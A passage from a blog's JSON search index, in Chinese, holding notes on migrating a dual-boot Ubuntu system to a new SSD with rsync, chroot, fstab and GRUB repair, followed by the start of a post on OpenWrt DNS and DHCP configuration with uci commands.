\u7cfb\u7edf\u8fc1\u79fb","text":"","tags":["\u7cfb\u7edf\u8fc1\u79fb","rsync","fstab","grub"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/22/2022-07-22-linux%E7%B3%BB%E7%BB%9F%E8%BF%81%E7%A7%BB/#linux-\u7cfb\u7edf\u8fc1\u79fb","title":"linux \u7cfb\u7edf\u8fc1\u79fb","text":"<p>\u4e70\u4e86\u4e00\u6761\u4e09\u661f\u7684 PM9A1 SSD\uff0c\u60f3\u8981\u628a\u539f\u672c\u7684 linux \u8fc1\u79fb\u5230\u65b0\u7684\u56fa\u6001\u4e0a\u3002</p>","tags":["\u7cfb\u7edf\u8fc1\u79fb","rsync","fstab","grub"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/22/2022-07-22-linux%E7%B3%BB%E7%BB%9F%E8%BF%81%E7%A7%BB/#\u7cfb\u7edf\u4fe1\u606f","title":"\u7cfb\u7edf\u4fe1\u606f","text":"<ul> <li>\u539f\u672c\u7684\u7cfb\u7edf\uff08windows \u548c ubuntu \u53cc\u7cfb\u7edf\uff09\u5b89\u88c5\u5728\u56fa\u6001\u4e0a\uff0c\u5305\u542b EFI \u5206\u533a\u3002</li> <li>\u7cfb\u7edf\u5f15\u5bfc\u65b9\u5f0f\uff1aEFI/GPT\uff08\u5176\u5b83\u65b9\u5f0f\u6709 BIOS/MBR, BIOS/GPT\uff09 <p>BIOS system</p> <p>On a BIOS/GPT system there is no MBR and therefore no place to store the loader. The GPT partition specification allows for an unformatted partition of the BIOS boot partition type (0xEF02). The size of this partition can be as small as 1 mebibyte. The Calamares installer uses a fixed size of 32 mebibyte. On a BIOS/MBR system a part of the bootloader is written to the Master Boot Record for the primary disk.</p> </li> </ul>","tags":["\u7cfb\u7edf\u8fc1\u79fb","rsync","fstab","grub"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/22/2022-07-22-linux%E7%B3%BB%E7%BB%9F%E8%BF%81%E7%A7%BB/#\u6b65\u9aa4","title":"\u6b65\u9aa4","text":"","tags":["\u7cfb\u7edf\u8fc1\u79fb","rsync","fstab","grub"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/22/2022-07-22-linux%E7%B3%BB%E7%BB%9F%E8%BF%81%E7%A7%BB/#\u683c\u5f0f\u5316\u78c1\u76d8","title":"\u683c\u5f0f\u5316\u78c1\u76d8","text":"<p>\u5728\u56fa\u6001\u4e0a\u521b\u5efa\u4e24\u4e2a\u5206\u533a</p> <ul> <li>EFI \u5206\u533a\uff0c100MB\uff0c\u683c\u5f0f\u5316\u4e3a FAT32<ul> <li>gparted \u53ef\u4ee5\u8bbe\u7f6e\u5206\u533a\u540d\u79f0\u547d\u540d\u4e3a EFI</li> <li>\u8bbe\u7f6e\u6807\u5fd7\u4e3a\"boot esp\"</li> </ul> </li> <li>\u7cfb\u7edf\u6839\u76ee\u5f55\u5206\u533a\uff0c\u5269\u4f59\u7a7a\u95f4\uff0c\u683c\u5f0f\u5316\u4e3a ext4</li> </ul>","tags":["\u7cfb\u7edf\u8fc1\u79fb","rsync","fstab","grub"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/22/2022-07-22-linux%E7%B3%BB%E7%BB%9F%E8%BF%81%E7%A7%BB/#\u6302\u8f7d\u78c1\u76d8","title":"\u6302\u8f7d\u78c1\u76d8","text":"<pre><code>mkdir /mnt/ubuntu\nsudo mount /dev/nvme0np2 /mnt/ubuntu\n</code></pre>","tags":["\u7cfb\u7edf\u8fc1\u79fb","rsync","fstab","grub"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/22/2022-07-22-linux%E7%B3%BB%E7%BB%9F%E8%BF%81%E7%A7%BB/#\u5907\u4efd\u590d\u5236\u6587\u4ef6","title":"\u5907\u4efd/\u590d\u5236\u6587\u4ef6","text":"<p>\u53ef\u4ee5\u5c06\u7cfb\u7edf\u6839\u76ee\u5f55\uff08\u9700\u8981\u6392\u9664\u4e00\u4e9b\u76ee\u5f55\uff09\u6253\u5305\u538b\u7f29\u6210\u4e00\u4e2a\u5907\u4efd\u6587\u4ef6\uff0c\u7136\u540e\u89e3\u538b\u5230\u65b0\u56fa\u6001\u6839\u76ee\u5f55\u5206\u533a\u4e2d\u3002\u597d\u5904\u662f\u4ee5\u540e\u53ef\u4ee5\u518d\u6b21\u4ece\u5907\u4efd\u4e2d\u6062\u590d\u3002</p> <p>\u4e5f\u53ef\u4ee5\u76f4\u63a5\u5c06\u7cfb\u7edf\u590d\u5236\u5230\u65b0\u7684\u56fa\u6001\u4e0a</p>","tags":["\u7cfb\u7edf\u8fc1\u79fb","rsync","fstab","grub"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/22/2022-07-22-linux%E7%B3%BB%E7%BB%9F%E8%BF%81%E7%A7%BB/#tar","title":"tar","text":"<p>\u53c2\u8003 https://rovo98.github.io/posts/3babee60/</p>","tags":["\u7cfb\u7edf\u8fc1\u79fb","rsync","fstab","grub"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/22/2022-07-22-linux%E7%B3%BB%E7%BB%9F%E8%BF%81%E7%A7%BB/#rsync","title":"rsync","text":"<p>rsync \u7528\u4e8e\u5728\u4e24\u53f0\u673a\u5668\u95f4\u590d\u5236\u6587\u4ef6\uff0c\u4f1a\u6bd4\u8f83\u6e90\u76ee\u5f55\u548c\u76ee\u7684\u76ee\u5f55\u5185\u7684\u6587\u4ef6\uff0c\u907f\u514d\u590d\u5236\u91cd\u590d\u7684\u6587\u4ef6</p> <p>\u4e0d\u7528 cp \u4e3b\u8981\u662f cp \u6392\u9664\u76ee\u5f55\u4e0d\u592a\u65b9\u4fbf\u3002\u5e76\u4e14\u4e07\u4e00\u51fa\u73b0\u95ee\u9898\u9700\u8981\u91cd\u65b0\u590d\u5236\uff0c\u9700\u8981\u91cd\u65b0\u590d\u5236\u8986\u76d6\u4e4b\u524d\u590d\u5236\u8fc7\u7684\u6587\u4ef6\u3002</p> <pre><code>rsync -aP --delete --exclude={\"/dev/*\",\"/proc/*\",\"/sys/*\",\"/tmp/*\",\"/run/*\",\"/mnt/*\",\"/media/*\",\"/lost+found\",\"/swapfile\",\"/home/yfy/D/*\",\"/home/yfy/Disk/*\"} / /mnt/ubuntu/ | tee /tmp/rsync_backup.log\n</code></pre> <pre><code> mount -o compress=zstd,subvol=/root /dev/nvme0n1p2 /mnt/ryzen\n mount -o compress=zstd,subvol=/home /dev/nvme0n1p2 /mnt/ryzen/home\n\nrsync -aP --delete --exclude={\"/dev/*\",\"/proc/*\",\"/sys/*\",\"/tmp/*\",\"/run/*\",\"/mnt/*\",\"/media/*\",\"/lost+found\",\"/swapfile\"} / /mnt/ryzen/ | tee /tmp/rsync_backup.log\n</code></pre> <p>\u9009\u9879\u8bf4\u660e</p> <ul> <li>-a\uff1a\u4fdd\u6301\u6587\u4ef6\u5c5e\u6027</li> <li>-P\uff1a\u663e\u793a\u8fdb\u5ea6\u6761</li> <li>--delete\uff1a\u5220\u9664\u76ee\u7684\u76ee\u5f55\u6bd4\u6e90\u76ee\u5f55\u591a\u51fa\u7684\u6587\u4ef6</li> <li>--exclude\uff1a\u6392\u9664\u6587\u4ef6\u5217\u8868\u3002\"/dev/*\"\u4e2d\u7684\"*\"\u7528\u4e8e\u5728\u76ee\u7684\u76ee\u5f55\u4e2d\u4fdd\u7559\u7a7a\u7684 dev \u76ee\u5f55<ul> <li>\u6392\u9664\u9879\u4e2d\u95f4<code>,</code>\u4e0d\u80fd\u63a5\u7a7a\u683c\uff0c\u5426\u5219\u683c\u5f0f\u9519\u8bef</li> <li>\u6392\u9664\u9879\u8868\u793a\u5339\u914d\u6a21\u5f0f\u3002rsync exclude directory not working - Unix &amp; Linux Stack Exchange<ul> <li>\u6839\u76ee\u5f55\u662f transfer root \u4f5c\u4e3a\u6839\u76ee\u5f55</li> <li>\u4e0d\u4ece\u6839\u76ee\u5f55\u5f00\u59cb\uff0c\u5219\u4f1a\u6392\u9664\u6240\u6709\u540c\u540d\u7684\u76ee\u5f55</li> </ul> </li> <li>\u5751\uff1a\u5982\u679c--exclude \u53ea\u7528\u4e8e\u6392\u9664\u4e00\u4e2a\u9879\u7684\u8bdd\uff0c\u4e0d\u8981\u7528\u82b1\u62ec\u53f7\u3002</li> </ul> </li> <li>\u6709\u65e0\u659c\u7ebf\uff1asrc dst/\u8868\u793a\u5c06src\u76ee\u5f55\u81ea\u8eab\u590d\u5236\u5230dst\u76ee\u5f55\u4e0b\uff0csrc/ dst/\u5219\u5c06src\u76ee\u5f55\u4e0b\u5185\u5bb9\u590d\u5236\u5230dst\u76ee\u5f55\u4e0b</li> <li>\u5efa\u8bae\u4f7f\u7528 --dry-run \u5148\u770b\u770b\u4f1a\u590d\u5236\u4ec0\u4e48</li> </ul> <p>\u5efa\u8bae\u9605\u8bfb man rsync \u4e0b\u9762\u4e24\u4e2a\u90e8\u5206</p> <p>INCLUDE/EXCLUDE PATTERN RULES</p> <p>ANCHORING INCLUDE/EXCLUDE PATTERNS</p> <pre><code>ANCHORING INCLUDE/EXCLUDE PATTERNS\n       As mentioned earlier, global include/exclude patterns are anchored at the \"root of the transfer\" (as opposed to per-directory patterns, which are\n       anchored  at  the  merge-file's  directory).  If you think of the transfer as a subtree of names that are being sent from sender to receiver, the\n       transfer-root is where the tree starts to be duplicated in the destination directory.  This root governs where  patterns  that  start  with  a  /\n       match.\n\n       Because the matching is relative to the transfer-root, changing the trailing slash on a source path or changing your use of the --relative option\n       affects the path you need to use in your matching (in addition to changing how much of the file tree is duplicated on the destination host).  The\n       following examples demonstrate this.\n\n       Let's  say  that  we want to match two source files, one with an absolute path of \"/home/me/foo/bar\", and one with a path of \"/home/you/bar/baz\".\n       Here is how the various command choices differ for a 2-source transfer:\n\n           Example cmd: rsync -a /home/me /home/you /dest\n           +/- pattern: /me/foo/bar\n           +/- pattern: /you/bar/baz\n           Target file: /dest/me/foo/bar\n           Target file: /dest/you/bar/baz\n\n           Example cmd: rsync -a /home/me/ /home/you/ /dest\n           +/- pattern: /foo/bar               (note missing \"me\")\n           +/- pattern: /bar/baz               (note missing \"you\")\n           Target file: /dest/foo/bar\n           Target file: /dest/bar/baz\n\n           Example cmd: rsync -a --relative /home/me/ /home/you /dest\n           +/- pattern: /home/me/foo/bar       (note full path)\n           +/- pattern: /home/you/bar/baz      (ditto)\n           Target file: /dest/home/me/foo/bar\n           Target file: /dest/home/you/bar/baz\n\n           Example cmd: cd /home; rsync -a --relative me/foo you/ /dest\n           +/- pattern: /me/foo/bar      (starts at specified path)\n           +/- pattern: /you/bar/baz     (ditto)\n           Target file: /dest/me/foo/bar\n           Target file: /dest/you/bar/baz\n</code></pre>","tags":["\u7cfb\u7edf\u8fc1\u79fb","rsync","fstab","grub"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/22/2022-07-22-linux%E7%B3%BB%E7%BB%9F%E8%BF%81%E7%A7%BB/#mount-efi","title":"mount EFI","text":"<p>\u4e4b\u540e\u9700\u8981\u4fee\u6539 efi \u5206\u533a\uff0c\u5148\u5c06\u5206\u533a\u6302\u8f7d\u5230\u5907\u4efd\u7cfb\u7edf\u5bf9\u5e94\u76ee\u5f55</p> <pre><code>sudo mount /dev/nvme0np1 /mnt/ubuntu/boot/efi\n</code></pre>","tags":["\u7cfb\u7edf\u8fc1\u79fb","rsync","fstab","grub"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/22/2022-07-22-linux%E7%B3%BB%E7%BB%9F%E8%BF%81%E7%A7%BB/#chroot","title":"chroot","text":"<p>chroot \u540e\u65b0\u7684\u8fdb\u7a0b\u4ee5\u53ca\u5b50\u8fdb\u7a0b\u90fd\u53ea\u80fd\u8bbf\u95ee\u65b0\u7684\u6839\u6587\u4ef6\u7cfb\u7edf\u5185\u7684\u6587\u4ef6\u3002\u4e0d\u77e5\u9053 chroot \u88ab\u53d1\u660e\u7684\u539f\u672c\u76ee\u7684\u662f\u4ec0\u4e48\uff0c\u4f46\u662f\u73b0\u5728\u6211\u4eec\u53ef\u4ee5\u5f88\u65b9\u4fbf\u5207\u6362\u5230\u5907\u4efd\u7684\u7cfb\u7edf\u4e2d\uff0c\u8fdb\u884c\u4fee\u6539\u3002</p> <pre><code>sudo chroot /mnt/ubuntu\n</code></pre>","tags":["\u7cfb\u7edf\u8fc1\u79fb","rsync","fstab","grub"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/22/2022-07-22-linux%E7%B3%BB%E7%BB%9F%E8%BF%81%E7%A7%BB/#mount-procsys-etc","title":"mount proc,sys etc","text":"<p>\u5728 chroot \u7684\u7cfb\u7edf\u4e2d\uff0c\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\uff0c\u5426\u5219\u65e0\u6cd5\u6267\u884c\u7a0b\u5e8f\u4ee5\u53ca\u4e00\u4e9b\u64cd\u4f5c\uff0c\u66f4\u5177\u4f53\u7684\u4f5c\u7528\u8fd8\u4e0d\u6e05\u695a\u3002</p> <pre><code>sudo su\ncd /mnt/arch # or where you are preparing the chroot dir\nmount -t proc /proc proc/\nmount --rbind /sys sys/\nmount --rbind /dev dev/\n</code></pre>","tags":["\u7cfb\u7edf\u8fc1\u79fb","rsync","fstab","grub"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/22/2022-07-22-linux%E7%B3%BB%E7%BB%9F%E8%BF%81%E7%A7%BB/#\u4fee\u590d-fstab","title":"\u4fee\u590d fstab","text":"<p>\u4fee\u6539 fstab \u6587\u4ef6\u4e2d\u6839\u76ee\u5f55\u548c EFI \u76ee\u5f55\u6302\u8f7d\u70b9\u8bbe\u5907\u7684 UUID \u4e3a\u65b0\u56fa\u6001\u7684 UUID</p> <pre><code>sudo vim /etc/fstab\n</code></pre> <ul> <li> <p>\u901a\u8fc7 blkid \u67e5\u770b UUID</p> <pre><code>blkid\n</code></pre> </li> </ul>","tags":["\u7cfb\u7edf\u8fc1\u79fb","rsync","fstab","grub"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/22/2022-07-22-linux%E7%B3%BB%E7%BB%9F%E8%BF%81%E7%A7%BB/#\u4fee\u590d-grub","title":"\u4fee\u590d grub","text":"<pre><code>root@ubuntu:/boot# update-grub\n\nSourcing file `/etc/default/grub'\nSourcing file `/etc/default/grub.d/init-select.cfg'\nGenerating grub configuration file ...\nFound linux image: /boot/vmlinuz-5.19.0-35-generic\nFound initrd image: /boot/initrd.img-5.19.0-35-generic\nFound linux image: /boot/vmlinuz-5.19.0-32-generic\nFound initrd image: /boot/initrd.img-5.19.0-32-generic\nMemtest86+ needs a 16-bit boot, that is not available on EFI, exiting\nWarning: os-prober will not be executed to detect other bootable partitions.\nSystems on them will not be added to the GRUB boot configuration.\nCheck GRUB_DISABLE_OS_PROBER documentation entry.\nAdding boot menu entry for UEFI Firmware Settings ...\ndone\n</code></pre> <p>\u6b64\u6b65\u9aa4\u4f1a\u68c0\u6d4b linux image, initrd image \u7684\u4f4d\u7f6e\uff0c\u4fee\u6539<code>/boot/grub/grub.cfg</code>\u83dc\u5355\u9879\u3002</p> <p>\u5982\u679c\u9047\u5230</p> <pre><code>EFI variables are not supported on this system.\n</code></pre> <ol> <li>\u9000\u51fa chroot</li> <li> <p>load efi filesystem</p> <pre><code>modprobe efivarfs\n</code></pre> </li> <li> <p>\u8fdb\u5165 chroot, mount the efi filesystem</p> <pre><code>mount -t efivarfs efivarfs /sys/firmware/efi/efivars\n</code></pre> </li> <li> <p>\u9a8c\u8bc1</p> <pre><code>ls /sys/firmware/efi\n</code></pre> </li> </ol>","tags":["\u7cfb\u7edf\u8fc1\u79fb","rsync","fstab","grub"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/22/2022-07-22-linux%E7%B3%BB%E7%BB%9F%E8%BF%81%E7%A7%BB/#\u5b89\u88c5-grub-\u5230-efi-\u5206\u533a","title":"\u5b89\u88c5 grub \u5230 EFI \u5206\u533a","text":"<pre><code>grub-install --target=x86_64-efi --efi-directory=/boot/efi --bootloader-id=GRUB\n</code></pre> <p>\u4f1a\u5728/boot/efi \u4e0b\u521b\u5efa</p> <pre><code>root@ubuntu:/boot/efi# grub-install\nInstalling for x86_64-efi platform.\nInstallation finished. No error reported.\n\n\nroot@ubuntu:/boot/efi# tree .\n.\n\u2514\u2500\u2500 EFI\n    \u251c\u2500\u2500 BOOT\n    \u2502\u00a0\u00a0 \u251c\u2500\u2500 BOOTX64.EFI\n    \u2502\u00a0\u00a0 \u251c\u2500\u2500 fbx64.efi\n    \u2502\u00a0\u00a0 \u2514\u2500\u2500 mmx64.efi\n    \u2514\u2500\u2500 ubuntu\n        \u251c\u2500\u2500 BOOTX64.CSV\n        \u251c\u2500\u2500 grub.cfg\n        \u251c\u2500\u2500 grubx64.efi\n        \u251c\u2500\u2500 mmx64.efi\n        \u2514\u2500\u2500 shimx64.efi\n</code></pre>","tags":["\u7cfb\u7edf\u8fc1\u79fb","rsync","fstab","grub"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/22/2022-07-22-linux%E7%B3%BB%E7%BB%9F%E8%BF%81%E7%A7%BB/#\u9047\u5230\u95ee\u9898","title":"\u9047\u5230\u95ee\u9898","text":"","tags":["\u7cfb\u7edf\u8fc1\u79fb","rsync","fstab","grub"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/22/2022-07-22-linux%E7%B3%BB%E7%BB%9F%E8%BF%81%E7%A7%BB/#\u542f\u52a8\u8fdb\u5165-grub-\u547d\u4ee4\u884c","title":"\u542f\u52a8\u8fdb\u5165 grub \u547d\u4ee4\u884c","text":"<p>\u521a\u5f00\u59cb\u91cd\u542f\u540e\uff0c\u4f1a\u8fdb\u5165 grub&gt;\u547d\u4ee4\u884c\uff0c\u800c\u975e grub \u83dc\u5355\u3002\u641c\u7d22\u540e\u77e5\u9053\u8fd9\u662f grub \u6ca1\u6709\u627e\u5230 grub.cfg \u6587\u4ef6\uff08\u4f46\u662f\u660e\u660e\u662f\u6709\u7684\uff09</p> <p>When you boot up your system and it stops at the <code>grub&gt;</code> prompt, that is the full GRUB 2 command shell.  That means GRUB 2 started normally and loaded the <code>normal.mod</code> module (and other modules which are located in <code>/boot/grub/[arch]/</code>), but it didn\u2019t find your <code>grub.cfg</code> file. If you see <code>grub rescue&gt;</code> that means it couldn\u2019t find <code>normal.mod</code>, so it probably couldn\u2019t find any of your boot files.</p> <p>\u53ef\u4ee5\u624b\u52a8\u5f15\u5bfc\u8fdb\u5165\u7cfb\u7edf</p> <ol> <li> <p>\u627e\u5230\u7cfb\u7edf\u4f4d\u7f6e\u3002\u53ef\u4ee5\u901a\u8fc7 ls \u77e5\u9053\u6709\u54ea\u4e9b\u78c1\u76d8\u548c\u5206\u533a\u3002\u7136\u540e\u518d\u901a\u8fc7\u5217\u51fa\u76ee\u5f55\u5185\u5bb9\u5224\u65ad\uff0c\u5982</p> <pre><code>ls (hdd1,gpt5)/\n</code></pre> </li> <li> <p>\u8bbe\u7f6e prefix\uff0croot</p> <pre><code>set prefix=(hd1,gpt5)/boot/grub\nset root=(hd1,gpt5)/\n</code></pre> </li> <li> <p>\u542f\u52a8</p> <pre><code>normal\n</code></pre> </li> </ol> <p>\u8fdb\u5165\u7cfb\u7edf\u540e\u518d\u91cd\u65b0\u4fee\u590d grub</p>","tags":["\u7cfb\u7edf\u8fc1\u79fb","rsync","fstab","grub"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/07/22/2022-07-22-linux%E7%B3%BB%E7%BB%9F%E8%BF%81%E7%A7%BB/#\u53c2\u8003","title":"\u53c2\u8003","text":"<ul> <li>\u4f7f\u7528 tar \u8fc1\u79fb\u7cfb\u7edf\uff1ahttps://rovo98.github.io/posts/3babee60/#%E8%BF%81%E7%A7%BB%E7%B3%BB%E7%BB%9F</li> </ul> <ul> <li>\u542f\u52a8\u8fdb\u5165 grub cmdline\uff1a<ul> <li>https://unix.stackexchange.com/questions/329926/grub-starts-in-command-line-after-reboot</li> <li>https://www.linuxfoundation.org/blog/classic-sysadmin-how-to-rescue-a-non-booting-grub-2-on-linux/</li> </ul> </li> </ul>","tags":["\u7cfb\u7edf\u8fc1\u79fb","rsync","fstab","grub"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/","title":"openwrt DNS \u8be6\u89e3","text":"","tags":["openwrt","dns","ipv6","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#openwrt-dns-\u8bf4\u660e","title":"openwrt DNS \u8bf4\u660e","text":"<p>\u53c2\u8003\uff1a</p> <ul> <li>[OpenWrt Wiki] DNS and DHCP configuration /etc/config/dhcp</li> <li>[OpenWrt Wiki] DNS and DHCP examples</li> </ul> <ul> <li>openwrt DNS \u548c DHCP \u914d\u7f6e\u5747\u4f4d\u4e8e/etc/config/dhcp</li> <li> <p>openwrt \u4f7f\u7528 dnsmasq \u548c odhcpd\u3002\u5b83\u4eec\u529f\u80fd\u5982\u4e0b\uff1a</p> <p></p> </li> </ul> <ul> <li>\u603b\u7ed3\u6765\u8bf4\uff1a<ul> <li>dnsmasq \u5c06\u81ea\u5df1\u8bbe\u7f6e\u4e3a DHCP \u5ba2\u6237\u7aef\u7684 DNS</li> <li>dnsmasq \u4f7f\u7528\u7f13\u5b58\u6765\u63d0\u5347\u6027\u80fd\u3002\u5230\u8fbe\u7684 dns \u8bf7\u6c42\u5982\u679c\u6ca1\u6709\u547d\u4e2d\u5219\u8f6c\u53d1\u7ed9\u4e0a\u6e38 DNS <p>Dnsmasq serves as a downstream caching DNS server advertising itself to DHCP clients. This allows better performance and management of DNS functionality on your local network. Every received DNS query not currently in cache is forwarded to the upstream DNS servers.</p> </li> </ul> </li> </ul>","tags":["openwrt","dns","ipv6","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#\u8bbe\u7f6e-dnsmasq-\u4e0a\u6e38-dns","title":"\u8bbe\u7f6e dnsmasq \u4e0a\u6e38 DNS","text":"<ul> <li>openwrt \u9ed8\u8ba4\u4f7f\u7528 peer dns \u4f5c\u4e3a\u4e0a\u6e38\u7684 dns\uff0c\u901a\u5e38\u7531 ISP \u4e0a\u6e38 DHCP \u670d\u52a1\u5668\u63d0\u4f9b</li> <li>dnsmasq \u5b9a\u671f\u67e5\u8be2\u6240\u6709\u7684 dns(resolver)\uff0c\u5e76\u4f7f\u7528\u6700\u5feb\u7684\u4e00\u4e2a</li> <li>\u591a dns provider<ul> <li>\u66f4\u80fd\u5bb9\u5fcd DoS \u653b\u51fb</li> <li>\u4e0d\u540c\u7684 DNS \u7531\u4e8e\u7f13\u5b58\u3001\u540c\u6b65\u3001\u8d1f\u8f7d\u5747\u8861\u53ef\u80fd\u8fd4\u56de\u4e0d\u540c\u7684\u7ed3\u679c\u3002\u4e3a\u4e86\u533a\u5206\u6b63\u786e\u7ed3\u679c\uff0c\u9700\u8981\u4f7f\u7528 DNSSEC\uff0c\u53ef\u80fd\u4f1a\u5bf9\u6027\u80fd\u9020\u6210\u635f\u5bb3\u3002 <p>To distinguish between correct and incorrect answers such as false-negatives, you need to utilize DNSSEC which may negatively impact fault tolerance and performance.</p> </li> </ul> </li> </ul>","tags":["openwrt","dns","ipv6","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#\u67e5\u770b\u4e0a\u6e38-dns","title":"\u67e5\u770b\u4e0a\u6e38 dns","text":"<pre><code>$ cat /tmp/resolv.conf.d/resolv.conf.auto\n# Interface wan\nnameserver 192.168.33.1\nsearch lan\n# Interface wan6\nnameserver 2409:8a38:1610:9a80::1\n</code></pre>","tags":["openwrt","dns","ipv6","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#luci-\u754c\u9762\u8bbe\u7f6e","title":"Luci \u754c\u9762\u8bbe\u7f6e","text":"<p>LuCI \u2192 Network \u2192 Interfaces \u2192 WAN &amp; WAN6 \u2192 Edit</p> <ul> <li>Use DNS servers advertised by peer</li> <li>Use custom DNS servers</li> </ul>","tags":["openwrt","dns","ipv6","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#uci-\u547d\u4ee4\u884c\u8bbe\u7f6e","title":"Uci \u547d\u4ee4\u884c\u8bbe\u7f6e","text":"<p>\u4f4d\u4e8e network \u914d\u7f6e\u6587\u4ef6\u4e2d</p> <pre><code># Configure DNS provider\nuci -q delete network.wan.dns\nuci add_list network.wan.dns=\"119.29.29.29\"\nuci add_list network.wan.dns=\"223.5.5.5\"\nuci add_list network.wan.dns=\"8.8.4.4\"\n\n# Configure IPv6 DNS provider\nuci -q delete network.wan6.dns\nuci add_list network.wan6.dns=\"2400:3200:baba::1\"\nuci add_list network.wan6.dns=\"2402:4e00::\"\nuci add_list network.wan6.dns=\"2001:4860:4860::8888\"\n\n# Disable peer DNS\nuci set network.wan.peerdns=\"0\"\nuci set network.wan6.peerdns=\"0\"\n\n# Save and apply\nuci commit network\n/etc/init.d/network restart\n</code></pre>","tags":["openwrt","dns","ipv6","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#\u5e38\u7528-dns","title":"\u5e38\u7528 dns","text":"<pre><code>\u8c37\u6b4c\n8.8.8.8\n8.8.4.4\n2001:4860:4860::8888\n2001:4860:4860::8844\n\n\u963f\u91cc\n223.5.5.5\n223.6.6.6\n2400:3200::1\n2400:3200:baba::1\n</code></pre>","tags":["openwrt","dns","ipv6","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#\u8bbe\u7f6e\u5ba2\u6237\u7aef-dns","title":"\u8bbe\u7f6e\u5ba2\u6237\u7aef DNS","text":"<p>\u53ef\u4ee5\u5728 windows \u4e2d\u81ea\u5df1\u8bbe\u7f6e dns</p>","tags":["openwrt","dns","ipv6","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#\u4f7f\u7528-dhcp-\u9009\u9879\u8bbe\u7f6e\u5ba2\u6237\u7aef-dns","title":"\u4f7f\u7528 dhcp \u9009\u9879\u8bbe\u7f6e\u5ba2\u6237\u7aef dns","text":"<ul> <li>\u53ef\u4ee5\u4e0d\u4f7f\u7528\u8def\u7531\u5668\u7684 DNS\uff0c\u8ba9\u624b\u673a\u7b49\u8bbe\u5907\u76f4\u63a5\u4f7f\u7528\u516c\u5171 DNS \u5982 8.8.8.8</li> <li>\u624b\u52a8\u4fee\u6539\u6bcf\u4e2a\u5ba2\u6237\u7aef\u592a\u9ebb\u70e6\uff0c\u53ef\u4ee5\u4f7f\u7528 DHCP \u9009\u9879\u81ea\u52a8\u8bbe\u7f6e</li> </ul> <pre><code># Configure dnsmasq\nuci -q delete dhcp.lan.dhcp_option\nuci add_list dhcp.lan.dhcp_option=\"6,8.8.8.8,8.8.4.4\"\nuci commit dhcp\n/etc/init.d/dnsmasq restart\n\n# Configure odhcpd\nuci -q delete dhcp.lan.dns\nuci add_list dhcp.lan.dns=\"2001:4860:4860::8888\"\nuci add_list dhcp.lan.dns=\"2001:4860:4860::8844\"\nuci commit dhcp\n/etc/init.d/odhcpd restart\n</code></pre>","tags":["openwrt","dns","ipv6","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#\u8c03\u8bd5","title":"\u8c03\u8bd5","text":"","tags":["openwrt","dns","ipv6","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#logread","title":"logread","text":"<p>\u5f88\u591a\u65f6\u5019 